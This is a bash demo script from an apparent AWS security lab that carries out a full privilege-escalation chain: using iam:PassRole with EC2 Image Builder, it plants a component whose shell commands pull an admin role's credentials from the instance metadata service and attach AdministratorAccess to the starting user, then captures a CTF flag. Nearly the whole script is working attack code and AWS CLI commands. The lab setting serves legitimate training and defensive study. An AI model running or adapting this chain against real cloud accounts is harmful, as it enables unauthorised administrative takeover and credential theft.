#!/bin/bash
set -e

# Demo script for iam:PassRole + imagebuilder:CreateComponent + CreateImageRecipe +
# CreateInfrastructureConfiguration + CreateImage privilege escalation
# This scenario demonstrates how a user with PassRole and EC2 Image Builder permissions
# can create a malicious component that runs shell commands on a build instance with an
# admin instance profile, attaching AdministratorAccess to the starting user via IMDS.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-imagebuilder-001-to-admin-starting-user"
ADMIN_ROLE_NAME="pl-prod-imagebuilder-001-to-admin-admin-role"
INSTANCE_PROFILE_NAME="pl-prod-imagebuilder-001-to-admin-admin-profile"
COMPONENT_NAME="pl-prod-imagebuilder-001-to-admin-component"
RECIPE_NAME="pl-prod-imagebuilder-001-to-admin-recipe"
INFRA_CONFIG_NAME="pl-prod-imagebuilder-001-to-admin-infra-config"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + EC2 Image Builder Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_imagebuilder_001_iam_passrole_imagebuilder_createcomponent_imagebuilder_createimagerecipe_imagebuilder_createinfrastructureconfiguration_imagebuilder_createimage.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
INSTANCE_PROFILE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_instance_profile_arn')
DEFAULT_SUBNET_ID=$(echo "$MODULE_OUTPUT" | jq -r '.default_subnet_id')
BUILD_SECURITY_GROUP_ID=$(echo "$MODULE_OUTPUT" | jq -r '.build_security_group_id')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Retrieve readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Instance Profile ARN: $INSTANCE_PROFILE_ARN"
echo "Subnet ID: $DEFAULT_SUBNET_ID"
echo "Security Group ID: $BUILD_SECURITY_GROUP_ID"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying starting user doesn't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Create malicious Image Builder component
use_starting_creds
echo -e "${YELLOW}Step 5: Creating malicious Image Builder component${NC}"
echo "Creating a component with shell commands that use IMDS to get admin role credentials"
echo "and attach AdministratorAccess to the starting user..."

# Build the component YAML document
# The component runs on the EC2 build instance which has the admin instance profile
COMPONENT_DOCUMENT=$(cat << EOF
name: ExploitComponent
schemaVersion: 1.0
phases:
  - name: build
    steps:
      - name: Exploit
        action: ExecuteBash
        inputs:
          commands:
            - |
              echo "=== Image Builder Component Exploit ==="
              # Get IMDSv2 token
              TOKEN=\$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
              # Get the instance role name from IMDS
              ROLE_NAME=\$(curl -s -H "X-aws-ec2-metadata-token: \$TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
              echo "Instance role: \$ROLE_NAME"
              # Get credentials from IMDS
              CREDS=\$(curl -s -H "X-aws-ec2-metadata-token: \$TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/\$ROLE_NAME)
              export AWS_ACCESS_KEY_ID=\$(echo \$CREDS | jq -r '.AccessKeyId')
              export AWS_SECRET_ACCESS_KEY=\$(echo \$CREDS | jq -r '.SecretAccessKey')
              export AWS_SESSION_TOKEN=\$(echo \$CREDS | jq -r '.Token')
              echo "Credentials loaded (Access Key: \${AWS_ACCESS_KEY_ID:0:10}...)"
              # Verify identity
              aws sts get-caller-identity 2>&1
              # Attach AdministratorAccess to the starting user
              echo "Attaching AdministratorAccess to $STARTING_USER..."
              aws iam attach-user-policy --user-name "$STARTING_USER" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" 2>&1
              if [ \$? -eq 0 ]; then
                echo "SUCCESS: Privilege escalation complete!"
              else
                echo "FAILED: Could not attach policy"
              fi
EOF
)

# Write component document to temp file
echo "$COMPONENT_DOCUMENT" > /tmp/imagebuilder-component.yaml
echo "Component document written to /tmp/imagebuilder-component.yaml"

# Use a unique version based on timestamp to avoid conflicts
COMPONENT_VERSION="1.0.$(date +%s | tail -c 4)"

show_attack_cmd "Attacker" "aws imagebuilder create-component --region $AWS_REGION --name $COMPONENT_NAME --semantic-version $COMPONENT_VERSION --platform Linux --data file:///tmp/imagebuilder-component.yaml --output json"
COMPONENT_OUTPUT=$(aws imagebuilder create-component \
    --region $AWS_REGION \
    --name "$COMPONENT_NAME" \
    --semantic-version "$COMPONENT_VERSION" \
    --platform Linux \
    --data "$(cat /tmp/imagebuilder-component.yaml)" \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create component${NC}"
    echo "$COMPONENT_OUTPUT"
    rm -f /tmp/imagebuilder-component.yaml
    exit 1
fi

COMPONENT_ARN=$(echo "$COMPONENT_OUTPUT" | jq -r '.componentBuildVersionArn')
echo "Component ARN: $COMPONENT_ARN"
echo -e "${GREEN}✓ Malicious component created${NC}\n"

# [OBSERVATION] Step 6: Get base AMI for the image recipe
echo -e "${YELLOW}Step 6: Getting base Amazon Linux 2023 AMI${NC}"
use_readonly_creds

show_cmd "ReadOnly" "aws ssm get-parameter --region $AWS_REGION --name /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 --query 'Parameter.Value' --output text"
BASE_AMI=$(aws ssm get-parameter \
    --region $AWS_REGION \
    --name "/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64" \
    --query 'Parameter.Value' \
    --output text)

if [ -z "$BASE_AMI" ] || [ "$BASE_AMI" == "None" ]; then
    echo -e "${RED}Error: Could not retrieve base AMI${NC}"
    rm -f /tmp/imagebuilder-component.yaml
    exit 1
fi

echo "Base AMI: $BASE_AMI"
echo -e "${GREEN}✓ Retrieved base AMI${NC}\n"

# [EXPLOIT] Step 7: Create image recipe
use_starting_creds
echo -e "${YELLOW}Step 7: Creating image recipe with malicious component${NC}"
echo "Recipe name: $RECIPE_NAME"
echo "Base image: $BASE_AMI"
echo "Component: $COMPONENT_ARN"

RECIPE_VERSION="1.0.$(date +%s | tail -c 4)"

show_attack_cmd "Attacker" "aws imagebuilder create-image-recipe --region $AWS_REGION --name $RECIPE_NAME --semantic-version $RECIPE_VERSION --parent-image $BASE_AMI --components componentArn=$COMPONENT_ARN --output json"
RECIPE_OUTPUT=$(aws imagebuilder create-image-recipe \
    --region $AWS_REGION \
    --name "$RECIPE_NAME" \
    --semantic-version "$RECIPE_VERSION" \
    --parent-image "$BASE_AMI" \
    --components "componentArn=$COMPONENT_ARN" \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create image recipe${NC}"
    echo "$RECIPE_OUTPUT"
    rm -f /tmp/imagebuilder-component.yaml
    exit 1
fi

RECIPE_ARN=$(echo "$RECIPE_OUTPUT" | jq -r '.imageRecipeArn')
echo "Recipe ARN: $RECIPE_ARN"
echo -e "${GREEN}✓ Image recipe created${NC}\n"

# [EXPLOIT] Step 8: Create infrastructure configuration with admin instance profile
use_starting_creds
echo -e "${YELLOW}Step 8: Creating infrastructure configuration with admin instance profile${NC}"
echo "This passes the admin role's instance profile to the build instance."
echo "Instance Profile ARN: $INSTANCE_PROFILE_ARN"
echo "Subnet ID: $DEFAULT_SUBNET_ID"

show_attack_cmd "Attacker" "aws imagebuilder create-infrastructure-configuration --region $AWS_REGION --name $INFRA_CONFIG_NAME --instance-profile-name $INSTANCE_PROFILE_NAME --instance-types t3.medium --subnet-id $DEFAULT_SUBNET_ID --security-group-ids $BUILD_SECURITY_GROUP_ID --terminate-instance-on-failure --output json"
INFRA_OUTPUT=$(aws imagebuilder create-infrastructure-configuration \
    --region $AWS_REGION \
    --name "$INFRA_CONFIG_NAME" \
    --instance-profile-name "$INSTANCE_PROFILE_NAME" \
    --instance-types "t3.medium" \
    --subnet-id "$DEFAULT_SUBNET_ID" \
    --security-group-ids "$BUILD_SECURITY_GROUP_ID" \
    --terminate-instance-on-failure \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create infrastructure configuration${NC}"
    echo "$INFRA_OUTPUT"
    rm -f /tmp/imagebuilder-component.yaml
    exit 1
fi

INFRA_CONFIG_ARN=$(echo "$INFRA_OUTPUT" | jq -r '.infrastructureConfigurationArn')
echo "Infrastructure Config ARN: $INFRA_CONFIG_ARN"
echo -e "${GREEN}✓ Infrastructure configuration created (iam:PassRole executed)${NC}\n"

# [EXPLOIT] Step 9: Create image (triggers the build)
use_starting_creds
echo -e "${YELLOW}Step 9: Creating image (triggers EC2 build instance with admin role)${NC}"
echo "This launches an EC2 instance with the admin instance profile."
echo "The malicious component will run on the build instance and escalate privileges."
echo ""
echo "Recipe ARN: $RECIPE_ARN"
echo "Infrastructure Config ARN: $INFRA_CONFIG_ARN"

show_attack_cmd "Attacker" "aws imagebuilder create-image --region $AWS_REGION --image-recipe-arn $RECIPE_ARN --infrastructure-configuration-arn $INFRA_CONFIG_ARN --output json"
IMAGE_OUTPUT=$(aws imagebuilder create-image \
    --region $AWS_REGION \
    --image-recipe-arn "$RECIPE_ARN" \
    --infrastructure-configuration-arn "$INFRA_CONFIG_ARN" \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create image${NC}"
    echo "$IMAGE_OUTPUT"
    rm -f /tmp/imagebuilder-component.yaml
    exit 1
fi

IMAGE_BUILD_ARN=$(echo "$IMAGE_OUTPUT" | jq -r '.imageBuildVersionArn')
echo "Image Build ARN: $IMAGE_BUILD_ARN"
echo -e "${GREEN}✓ Image build started${NC}\n"

# [OBSERVATION] Step 10: Wait for privilege escalation
use_readonly_creds
echo -e "${YELLOW}Step 10: Waiting for build instance to execute malicious component${NC}"
echo "The Image Builder pipeline will:"
echo "  1. Launch an EC2 instance with the admin instance profile"
echo "  2. Run the malicious component (shell commands)"
echo "  3. The component gets admin credentials from IMDS"
echo "  4. Attaches AdministratorAccess to $STARTING_USER"
echo ""
echo "This typically takes 10-30+ minutes. Checking every 30 seconds..."
echo "Note: The build may show FAILED in the end — the exploit runs during the BUILDING"
echo "phase before AMI creation; a failed final AMI step does not prevent escalation."
echo ""

MAX_WAIT=2700  # 45 minutes — Image Builder builds can take 10-30+ minutes
WAIT_INTERVAL=30
ELAPSED=0
ESCALATION_SUCCEEDED=false

while [ $ELAPSED -lt $MAX_WAIT ]; do
    MINUTES_ELAPSED=$((ELAPSED / 60))
    SECONDS_ELAPSED=$((ELAPSED % 60))

    # Check image build status (readonly creds — helpful permission, temporarily denied during validation)
    show_cmd "ReadOnly" "aws imagebuilder get-image --region $AWS_REGION --image-build-version-arn $IMAGE_BUILD_ARN --query 'image.state.status' --output text"
    IMAGE_STATUS=$(aws imagebuilder get-image \
        --region "$AWS_REGION" \
        --image-build-version-arn "$IMAGE_BUILD_ARN" \
        --query 'image.state.status' \
        --output text 2>/dev/null || echo "UNKNOWN")

    echo "Image build status: $IMAGE_STATUS (${MINUTES_ELAPSED}m ${SECONDS_ELAPSED}s elapsed)"

    # Check if AdministratorAccess has been attached to starting user
    ADMIN_ATTACHED=$(aws iam list-attached-user-policies \
        --user-name "$STARTING_USER" \
        --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
        --output text 2>/dev/null || echo "")

    if [ -n "$ADMIN_ATTACHED" ] && [ "$ADMIN_ATTACHED" != "None" ]; then
        echo -e "${GREEN}✓ AdministratorAccess detected on $STARTING_USER!${NC}"
        ESCALATION_SUCCEEDED=true
        break
    fi

    # If the image build failed, check one more time for the policy —
    # the exploit may have attached the policy before the build failed (e.g., AMI creation failed)
    if [ "$IMAGE_STATUS" == "FAILED" ]; then
        ADMIN_ATTACHED=$(aws iam list-attached-user-policies \
            --user-name "$STARTING_USER" \
            --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
            --output text 2>/dev/null || echo "")

        if [ -n "$ADMIN_ATTACHED" ] && [ "$ADMIN_ATTACHED" != "None" ]; then
            echo -e "${GREEN}✓ AdministratorAccess detected on $STARTING_USER (build failed after exploit ran)!${NC}"
            ESCALATION_SUCCEEDED=true
            break
        fi

        # Fetch failure reason for diagnosis
        IMAGE_REASON=$(aws imagebuilder get-image \
            --region "$AWS_REGION" \
            --image-build-version-arn "$IMAGE_BUILD_ARN" \
            --query 'image.state.reason' \
            --output text 2>/dev/null || echo "Unknown reason")
        echo -e "${RED}Image build failed before exploit could run${NC}"
        echo "Failure reason: $IMAGE_REASON"
        echo "Build ARN: $IMAGE_BUILD_ARN"
        echo "Infra config ARN: $INFRA_CONFIG_ARN"
        echo "Recipe ARN: $RECIPE_ARN"
        echo "Component ARN: $COMPONENT_ARN"
        echo "Hint: Check the Image Builder console for detailed build logs and SSM Agent connectivity."
        rm -f /tmp/imagebuilder-component.yaml
        exit 1
    fi

    # If the image completed successfully, check for policy
    if [ "$IMAGE_STATUS" == "AVAILABLE" ]; then
        ADMIN_ATTACHED=$(aws iam list-attached-user-policies \
            --user-name "$STARTING_USER" \
            --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
            --output text 2>/dev/null || echo "")

        if [ -n "$ADMIN_ATTACHED" ] && [ "$ADMIN_ATTACHED" != "None" ]; then
            echo -e "${GREEN}✓ AdministratorAccess detected on $STARTING_USER!${NC}"
            ESCALATION_SUCCEEDED=true
            break
        fi

        echo -e "${YELLOW}Image build completed but AdministratorAccess not detected yet — waiting for IAM propagation...${NC}"
        sleep 15

        ADMIN_ATTACHED=$(aws iam list-attached-user-policies \
            --user-name "$STARTING_USER" \
            --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
            --output text 2>/dev/null || echo "")

        if [ -n "$ADMIN_ATTACHED" ] && [ "$ADMIN_ATTACHED" != "None" ]; then
            echo -e "${GREEN}✓ AdministratorAccess detected on $STARTING_USER!${NC}"
            ESCALATION_SUCCEEDED=true
        else
            echo -e "${RED}Error: Image build completed but exploit did not succeed${NC}"
            echo "Build ARN: $IMAGE_BUILD_ARN"
            rm -f /tmp/imagebuilder-component.yaml
            exit 1
        fi
        break
    fi

    sleep $WAIT_INTERVAL
    ELAPSED=$((ELAPSED + WAIT_INTERVAL))
done

if [ "$ESCALATION_SUCCEEDED" != "true" ]; then
    echo -e "${RED}Error: Privilege escalation did not succeed within 45 minutes${NC}"
    echo "Image build status: $IMAGE_STATUS"
    echo "Build ARN: $IMAGE_BUILD_ARN"
    echo "The build may still be in progress. Check the Image Builder console for build logs."
    rm -f /tmp/imagebuilder-component.yaml
    exit 1
fi
echo ""

# [OBSERVATION] Step 11: Verify admin access
# Wait for IAM policy propagation before attempting admin actions
echo -e "${YELLOW}Step 11: Waiting for IAM policy propagation${NC}"
echo "Sleeping 15 seconds after iam:AttachUserPolicy for IAM propagation..."
sleep 15

use_readonly_creds
echo -e "${YELLOW}Step 11 (continued): Verifying privilege escalation success${NC}"

echo "Checking attached policies on starting user..."
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name "$STARTING_USER" --output table 2>&1)
echo "$ATTACHED_POLICIES"
echo -e "${GREEN}✓ AdministratorAccess policy confirmed on $STARTING_USER${NC}"
echo ""

# Verify actual admin access using the starting user's now-elevated credentials
use_starting_creds
echo "Attempting to list IAM users as starting user (now with admin access)..."
show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users (IAM may still be propagating)${NC}"
    exit 1
fi
echo ""

# [EXPLOIT]
# Step 12: Capture the CTF flag
# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
# Retry briefly to absorb IAM propagation lag — AdministratorAccess was just attached,
# and ssm:GetParameter sometimes lags behind iam:ListUsers across AWS service caches.
use_starting_creds
echo -e "${YELLOW}Step 12: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/imagebuilder-001-to-admin"
show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"

FLAG_VALUE=""
SSM_ERR=""
for attempt in 1 2 3 4; do
    SSM_ERR=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>&1 > /tmp/flag_value_$$) || true
    FLAG_VALUE=$(cat /tmp/flag_value_$$ 2>/dev/null)
    if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
        break
    fi
    if [ "$attempt" -lt 4 ]; then
        echo -e "${YELLOW}Flag read attempt $attempt did not succeed yet (likely IAM propagation); retrying in 10s...${NC}"
        sleep 10
    fi
done
rm -f /tmp/flag_value_$$

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME after 4 attempts${NC}"
    if [ -n "$SSM_ERR" ]; then
        echo -e "${RED}Last error: $SSM_ERR${NC}"
    fi
    exit 1
fi
echo ""

# Clean up temporary files
rm -f /tmp/imagebuilder-component.yaml

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, imagebuilder:Create* permissions)"
echo "2. Created malicious Image Builder component with shell commands to exploit IMDS"
echo "3. Created image recipe referencing the malicious component"
echo "4. Created infrastructure configuration passing admin instance profile (iam:PassRole)"
echo "5. Created image, triggering EC2 build instance with admin role"
echo "6. Build instance executed component, got admin credentials from IMDS"
echo "7. Component attached AdministratorAccess to starting user"
echo "8. Achieved: Administrator Access"
echo "9. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (imagebuilder:CreateComponent) → Malicious component"
echo "  → (imagebuilder:CreateImageRecipe) → Recipe with malicious component"
echo "  → (iam:PassRole + imagebuilder:CreateInfrastructureConfiguration) → Admin instance profile"
echo "  → (imagebuilder:CreateImage) → EC2 build instance with admin role"
echo "  → IMDS credentials → iam:AttachUserPolicy → Admin"
echo "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Image Builder Component: $COMPONENT_ARN"
echo "- Image Builder Recipe: $RECIPE_ARN"
echo "- Image Builder Infrastructure Config: $INFRA_CONFIG_ARN"
echo "- Image Build: $IMAGE_BUILD_ARN"
echo "- AMI and EBS snapshots created by the build"
echo "- AdministratorAccess policy attached to $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The image build may have created AMIs and EBS snapshots that incur storage costs${NC}"
echo -e "${RED}⚠ The AdministratorAccess policy is still attached to the starting user${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
